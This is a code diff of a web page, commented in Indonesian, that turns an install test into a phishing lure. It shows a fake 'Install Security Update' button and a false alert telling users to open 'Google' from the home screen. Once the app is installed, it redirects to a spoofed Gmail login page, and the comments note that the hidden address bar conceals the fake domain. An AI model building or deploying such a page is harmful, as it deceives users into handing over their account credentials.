@@ -17,37 +17,30 @@
   <button class="btn" id="installBtn">Install Security Update</button>
 
 <script>
-let deferredPrompt;
-const installBtn = document.getElementById('installBtn');
-const statusText = document.getElementById('status');
+// Cek jika aplikasi dibuka dari Home Screen (Mode Standalone)
+if (window.matchMedia('(display-mode: standalone)').matches) {
+    // IMPACT: Redirect langsung ke halaman login palsu lu
+    // Karena tidak ada Address Bar, user tidak bisa melihat domain ologoligature.github.io
+    window.location.href = "https://ologoligature.github.io/login-gmail-spoof.html";
+}
 
-// Chrome mendeteksi manifest.json dan ngasih lampu hijau buat install
+let deferredPrompt;
 window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     deferredPrompt = e;
-    
-    // Munculin tombol eksekusi
-    installBtn.style.display = 'block';
-    statusText.innerText = "Device compatible. Ready to install.";
+    document.getElementById('installBtn').style.display = 'block';
 });
 
-// Aksi ketika korban klik tombol
-installBtn.addEventListener('click', async () => {
+document.getElementById('installBtn').addEventListener('click', async () => {
     if (deferredPrompt) {
         deferredPrompt.prompt();
+        // Setelah klik install, kita beri instruksi palsu
         const { outcome } = await deferredPrompt.userChoice;
         if (outcome === 'accepted') {
-            statusText.innerText = "Installation prompt triggered successfully!";
-            installBtn.style.display = 'none';
+            alert("Security Module Installed. Please open 'Google' from your home screen to complete verification.");
         }
-        deferredPrompt = null;
     }
 });
-
-// Cek kalau lu lupa uninstall dari HP
-if (window.matchMedia('(display-mode: standalone)').matches) {
-    statusText.innerHTML = "⚠️ ERROR: WebAPK is already installed on this device.<br>Please uninstall it from your Home Screen to test the prompt again.";
-}
 </script>
 </body>
 </html>
